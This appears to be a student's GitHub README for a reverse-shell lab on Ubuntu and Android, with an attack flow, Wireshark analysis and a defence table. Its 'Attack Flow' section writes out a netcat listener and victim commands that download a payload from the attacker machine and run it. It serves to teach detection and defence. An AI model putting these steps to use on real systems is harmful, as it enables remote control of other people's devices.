# 🔐 Reverse Shell Security Lab
### Ethical Malware Analysis & Network Penetration Testing

> **Academic cybersecurity lab demonstrating reverse shell payload development, deployment, and traffic analysis on Linux and Android platforms — conducted in a fully isolated, controlled environment.**

[![Python](https://img.shields.io/badge/Python-3.x-blue?logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Android-green)](.)
[![Tools](https://img.shields.io/badge/Tools-Kali%20%7C%20Wireshark%20%7C%20Netcat-red)](.)
[![Environment](https://img.shields.io/badge/Environment-Isolated%20Lab-orange)](.)
[![License](https://img.shields.io/badge/License-Academic%20Use%20Only-yellow)](./LICENSE.md)

---

## 📋 Table of Contents

- [Overview](#overview)
- [Lab Environment](#lab-environment)
- [Repository Structure](#repository-structure)
- [Ubuntu Lab](#ubuntu-lab--payload-creation)
- [Android Lab](#android-lab--payload-creation)
- [Network Architecture](#network-architecture)
- [Attack Flow](#attack-flow)
- [Defense Strategies](#defense-strategies)
- [Tools Used](#tools-used)
- [Ethical Considerations](#ethical-considerations)

---

## Overview

This project documents a hands-on cybersecurity lab focused on understanding how reverse shell payloads operate on **Linux (Ubuntu)** and **Android** systems. The goal is educational: by simulating attacker techniques in a safe, isolated environment, security professionals can better understand how to **detect, monitor, and defend** against such attacks.

**Key objectives:**
- Develop Python-based reverse shell scripts for Linux and Android
- Establish remote shell sessions using Netcat listeners
- Capture and analyze network traffic using Wireshark
- Document defensive strategies based on observed attack behavior

---

## Lab Environment

| Component | Details |
|---|---|
| **Attacker Machine** | Kali Linux (VirtualBox VM) |
| **Victim 1** | Ubuntu Linux (VirtualBox VM) |
| **Victim 2** | Samsung SM-A145F — Android 15 (Physical Device) |
| **Virtualization** | Oracle VirtualBox |
| **Network (Ubuntu)** | Host-Only Adapter — fully isolated |
| **Network (Android)** | Bridged Adapter — local network only |
| **Listener Tool** | Netcat (`nc -lvnp 4444`) |
| **Traffic Analyzer** | Wireshark |
| **Scripting Language** | Python 3 |

---

## Repository Structure

```
reverse-shell-security-lab/
│
├── README.md
├── DISCLAIMER.md
├── LICENSE.md
├── requirements.txt
│
├── scripts/
│   ├── ubuntu_reverse_shell.py
│   └── android_reverse_shell.py
│
├── docs/
│   ├── technical-report.md
│   ├── ubuntu-payload-creation.md
│   └── android-payload-creation.md
│
└── screenshots/
    ├── ubuntu/   (11 screenshots)
    └── android/  (10 screenshots)
```

---

## Ubuntu Lab — Payload Creation

> Full walkthrough: [`docs/ubuntu-payload-creation.md`](./docs/ubuntu-payload-creation.md) | Script: [`scripts/ubuntu_reverse_shell.py`](./scripts/ubuntu_reverse_shell.py)

### Step 1 — IP Configuration Verification

Both machines verified on the `192.168.56.0/24` subnet using `ip a`.

**Kali Linux — `192.168.56.102`**

![Kali IP Config](./screenshots/ubuntu/01_ip_config_kali.png)

**Ubuntu — `192.168.56.103`**

![Ubuntu IP Config](./screenshots/ubuntu/02_ip_config_ubuntu.png)

---

### Step 2 — Connectivity Test (Ping)

Ping performed in both directions to confirm network reachability.

**Ubuntu → Kali**

![Ping Ubuntu to Kali](./screenshots/ubuntu/03_ping_ubuntu_to_kali.png)

**Kali → Ubuntu** (0% packet loss confirmed)

![Ping Kali to Ubuntu](./screenshots/ubuntu/04_ping_kali_to_ubuntu.png)

---

### Step 3 — Python Reverse Shell Script

Script written on Kali using `nano`. Connects back to Kali on port `4444`, executes commands, logs output locally.

![Script in Nano](./screenshots/ubuntu/05_script_in_nano.png)

---

### Step 4 — File Transfer to Ubuntu

Script hosted via Python HTTP server on Kali and downloaded on Ubuntu via `wget`.

**Kali — HTTP server serving the file**

![HTTP Server on Kali](./screenshots/ubuntu/06_http_server_kali.png)

**Ubuntu — wget download (38.4 MB/s, 747 bytes)**

![wget File Transfer](./screenshots/ubuntu/07_wget_file_transfer.png)

**Ubuntu — files confirmed present**

![File Listing Ubuntu](./screenshots/ubuntu/08_file_listing_ubuntu.png)

---

### Step 5 — Session Established

Netcat listener started on Kali (`nc -lvnp 4444`), then script executed on Ubuntu. Connection received immediately.

![Session Established](./screenshots/ubuntu/09_session_established.png)

---

### Step 6 — Wireshark Traffic Analysis

Wireshark captured all TCP traffic on port 4444 throughout the session. Filter: `tcp.port == 4444`.

**Wireshark launch and capture start**

![Wireshark Launch](./screenshots/ubuntu/10_wireshark_launch.png)

**TCP traffic on port 4444 — PSH/ACK packets carrying commands and output**

![Wireshark tcp.port 4444](./screenshots/ubuntu/11_wireshark_tcp4444.png)

---

## Android Lab — Payload Creation

> Full walkthrough: [`docs/android-payload-creation.md`](./docs/android-payload-creation.md) | Script: [`scripts/android_reverse_shell.py`](./scripts/android_reverse_shell.py)

### Step 1 — Bridged Network Configuration (VirtualBox)

Kali VM configured with Bridged Adapter to join the same local network as the physical Android device.

![Bridged Network Config](./screenshots/android/01_bridged_network_config.png)

---

### Step 2 — Android Device Info

Physical Samsung device running Android 15 (One UI 7.0).

![Android Version](./screenshots/android/02_android_version.png)

---

### Step 3 — Termux Installation

Termux installed via F-Droid to provide a Linux-like Python environment on Android.

![Termux Installed](./screenshots/android/03_termux_installed.png)

---

### Step 4 — IP Configuration & Connectivity

Kali IP confirmed at `192.168.0.104`. Ping test from Termux verified network reachability.

**Kali — Bridged IP (`192.168.0.104`)**

![Kali IP Config Android Lab](./screenshots/android/04_kali_ip_config.png)

**Termux — ping to Kali (successful)**

![Termux Ping Test](./screenshots/android/05_termux_ping_test.png)

---

### Step 5 — Python Reverse Shell Script (Android)

Android script written in Termux's nano. Includes device fingerprinting, heartbeat messages, and timestamped logging.

![Android Script in Nano](./screenshots/android/06_script_in_nano.png)

---

### Step 6 — File Transfer to Android

Script hosted on Kali via HTTP server and downloaded into Termux.

![HTTP Server Transfer](./screenshots/android/07_http_server_transfer.png)

---

### Step 7 — Script Execution on Android

Script executed in Termux. Immediately initiated TCP connection to Kali listener.

![Script Execution Android](./screenshots/android/08_script_execution.png)

---

### Step 8 — Session Established

Full reverse shell session established. Device info, heartbeats, and command output all visible on Kali.

```
[+] Android (Termux) connected
Model: SM-A145F
Android Version: 15
[HB] Android Termux alive
whoami → u0_a824
ls → connection_log.txt  mahrukh_payload.py  mahrukh_reverseshell.py
pwd → /data/data/com.termux/files/home
```

![Android Session Established](./screenshots/android/09_session_established.png)

---

### Step 9 — Wireshark Traffic Analysis

Wireshark on Kali captured all Android session traffic. TCP port 4444 filter applied.

![Wireshark Android](./screenshots/android/10_wireshark_android.png)

---

## Network Architecture

```
╔══════════════════════════════════════════════════════════╗
║                ISOLATED LAB ENVIRONMENT                  ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║   ┌─────────────────┐     Host-Only (192.168.56.0/24)   ║
║   │   Kali Linux    │◄───────────────────────────────┐  ║
║   │   (Attacker)    │                                │  ║
║   │  192.168.56.102 │     Bridged (192.168.0.0/24)   │  ║
║   │  192.168.0.106  │◄──────────────────────┐        │  ║
║   └────────┬────────┘                       │        │  ║
║            │                                │        │  ║
║     [Netcat + Wireshark]                    │        │  ║
║                                    ┌────────┴──┐  ┌──┴────────────┐
║                                    │  Android  │  │    Ubuntu     │
║                                    │ SM-A145F  │  │ 192.168.56.103│
║                                    │ Android 15│  │               │
║                                    └───────────┘  └───────────────┘
╚══════════════════════════════════════════════════════════╝
```

---

## Attack Flow

```
[Attacker — Kali Linux]
   │  1. nc -lvnp 4444           → Start listener
   │  2. python3 -m http.server  → Host payload
   │
[Victim — Ubuntu / Android]
   │  3. wget http://[kali]:8080/payload.py  → Download
   │  4. python3 payload.py                  → Execute
   │
   │  ← Outbound TCP connection to Kali:4444 →
   │  (bypasses inbound firewall restrictions)
   │
[Attacker — Kali]
   │  5. Connection accepted
   │  6. Send commands → receive output in real time
   │
[Wireshark]
   └  7. tcp.port == 4444 → all traffic captured
```

---

## Defense Strategies

| Layer | Strategy | Tool / Technique |
|---|---|---|
| **Network** | Monitor unusual outbound TCP connections | Firewall logs, SIEM |
| **Network** | Egress filtering on non-standard ports | Firewall ACLs |
| **Detection** | Intrusion Detection System | Snort, Suricata |
| **Endpoint** | Detect suspicious process spawning | EDR (CrowdStrike, Defender) |
| **Application** | Whitelist permitted executables | AppArmor, SELinux |
| **Logging** | Analyze command execution anomalies | auditd, Syslog |
| **Monitoring** | Real-time traffic inspection | Wireshark, Zeek |
| **Mobile** | Restrict sideloading on managed devices | MDM policies |

> **Key finding:** All communication in this lab was transmitted as **unencrypted plaintext** — the payload's commands and outputs were fully readable in Wireshark packet captures. This demonstrates that basic network monitoring would immediately detect this type of attack.

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Kali Linux** | Attacker machine, all offensive tooling |
| **Oracle VirtualBox** | Virtualization platform |
| **Netcat** | TCP listener (`nc -lvnp 4444`) |
| **Wireshark** | Network traffic capture and analysis |
| **Python 3** | Reverse shell scripting |
| **Termux (F-Droid)** | Linux-like Python environment on Android |
| **Python HTTP Server** | Lightweight file transfer between machines |

---

## Ethical Considerations

> ⚠️ **This project is strictly for educational and academic purposes.**

- All systems were personally owned by the student
- Lab conducted in a **fully isolated environment** with no internet access
- No real users, external networks, or production systems were involved
- Scripts are **non-destructive** — read-only command execution only
- This work is intended to strengthen **defensive** cybersecurity skills

See [`DISCLAIMER.md`](./DISCLAIMER.md) for the full legal and ethical notice.

---

## 👤 Author

**Mahrukh**  
Cybersecurity Student  
🐙 [GitHub](https://github.com/mahrukh89) | 📧 [Add your email] | 🔗 [Add your LinkedIn]

---

*All activities documented here were conducted in a controlled, ethical, and isolated lab environment for academic purposes.*
